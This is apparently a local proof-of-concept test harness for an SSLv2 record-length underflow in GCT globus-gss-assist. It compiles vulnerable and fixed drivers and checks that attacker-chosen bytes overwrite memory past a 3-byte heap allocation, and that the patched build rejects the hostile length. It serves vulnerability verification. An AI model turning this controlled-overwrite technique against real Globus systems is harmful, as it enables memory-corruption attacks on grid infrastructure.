#!/usr/bin/env bash
# Source-bound GCT globus-gss-assist SSLv2 length-underflow harness.
# All inputs are local argv values standing in for a GSI handshake record;
# no socket or external system is contacted.
set -uo pipefail
HERE=$(cd "$(dirname "$0")" && pwd)
ulimit -c 0 2>/dev/null || true
OUT=${1:-"$HERE/out"}
mkdir -p "$OUT"
cd "$HERE" || exit 2
OUT=$(cd "$OUT" && pwd)

pass=0; fail=0
check() {
    if [ "$2" = 1 ]; then echo "PASS $1"; pass=$((pass + 1));
    else echo "FAIL $1"; fail=$((fail + 1)); fi
}
contains() { case "$2" in *"$1"*) return 0;; *) return 1;; esac; }
yes() { contains "$1" "$2" && echo 1 || echo 0; }

python3 gen_driver.py > "$OUT/gen.log" || exit 2
for t in vuln fixed vuln_asan fixed_asan; do
    src=driver_${t%_asan}.c
    case "$t" in
        *_asan) gcc -std=gnu11 -g -O0 -fsanitize=address -fno-omit-frame-pointer \
                    "$src" -o "$OUT/$t" || exit 2 ;;
        *)      gcc -std=gnu11 -g -O0 "$src" -o "$OUT/$t" || exit 2 ;;
    esac
done
V="$OUT/vuln"; F="$OUT/fixed"; VA="$OUT/vuln_asan"; FA="$OUT/fixed_asan"

# Rung 1: SSLv2 record length 1 => dsize -2, size 3, undersized allocation.
r1=$($V collab 1 32 65)
echo "$r1"
check "rung1 record len 1 underflows to alloc 3" \
    "$(yes 'rv=1 size=0 alloc=3' "$r1")"

# Rung 2: chosen header bytes clobber the 3-byte allocation and the
# (size_t)-cast fread writes 32 body bytes past it; both are read back.
r2=$($V collab 1 32 65)
echo "$r2"
ok=0
contains 'bytes5=4142434441424344' "$r2" &&
contains 'bytes32=4142434441424344414243444142434441424344414243444142434441424344' "$r2" && ok=1
check "rung2 chosen header + 32 body bytes past alloc" "$ok"

# Rung 3: ASan traps the verbatim 5-byte memcpy at pinned line 172.
"$VA" exact 1 32 65 > "$OUT/asan.log" 2>&1
ac=$(cat "$OUT/asan.log")
ok=0
contains 'heap-buffer-overflow' "$ac" &&
contains 'WRITE of size 5' "$ac" &&
contains 'tokens_f_edf946b5:172' "$ac" && ok=1
check "rung3 ASan memcpy write at pinned :172" "$ok"

# Rung 4: selected body bytes at a selected offset, with a different seed.
r4=$($V collab 1 32 90)
echo "$r4"
ok=0
contains 'alloc=3' "$r4" &&
contains 'bytes5=5a5b5c5d5a5b5c5d' "$r4" &&
contains 'bytes32=5a5b5c5d5a5b5c5d5a5b5c5d5a5b5c5d5a5b5c5d5a5b5c5d5a5b' "$r4" && ok=1
check "rung4 chosen 0x5a bytes at offset +5" "$ok"

# Guard page: the first 5-byte memcpy crosses into PROT_NONE.
( "$V" guard 1 8 65 > "$OUT/guard.log" 2>&1 )
grc=$?
check "guard page fault on first OOB memcpy" "$([ "$grc" -eq 139 ] && echo 1 || echo 0)"

# Fixed commit: hostile length rejected before allocation; benign length ok.
fc=$($F collab 1 32 65)
check "fixed rejects record len 1" "$(yes 'rv=2 size=0 alloc=0' "$fc")"
fg=$($F collab 6 4 65)
check "fixed accepts benign record len 6" "$(yes 'rv=0 size=8 alloc=8' "$fg")"

"$FA" exact 1 32 65 > "$OUT/fixed_asan_bad.log" 2>&1
"$FA" exact 6 4 65 > "$OUT/fixed_asan_good.log" 2>&1
fb=$(cat "$OUT/fixed_asan_bad.log")
fgo=$(cat "$OUT/fixed_asan_good.log")
ok=0
! contains 'AddressSanitizer' "$fb" && ! contains 'AddressSanitizer' "$fgo" && ok=1
check "fixed ASan clean on hostile and benign" "$ok"
ok=0
contains 'rv=2' "$fb" && contains 'rv=0' "$fgo" && ok=1
check "fixed ASan outcomes" "$ok"

# Determinism: two independent five-run groups, chosen bytes and pinned line.
group() {
    for i in 1 2 3 4 5; do
        "$V" collab 1 32 65
        "$VA" exact 1 32 65 2>&1 | grep -E 'ERROR: AddressSanitizer|tokens_f_edf946b5:172' | head -2
        "$F" collab 1 32 65
    done | grep -v -E '0x[0-9a-f]+|pid=|SUMMARY: AddressSanitizer' \
        | sha256sum | cut -d' ' -f1
}
h1=$(group); h2=$(group)
echo "sha256=$h1 sha256_b=$h2 (two independent 5-run groups)"
check "determinism two 5-run groups identical" "$([ "$h1" = "$h2" ] && echo 1 || echo 0)"

echo "TOTAL PASS=$pass FAIL=$fail"
[ "$fail" -eq 0 ] && { echo "ALL CHECKS PASS rc 0"; exit 0; }
echo "SOME CHECKS FAILED rc 1"; exit 1
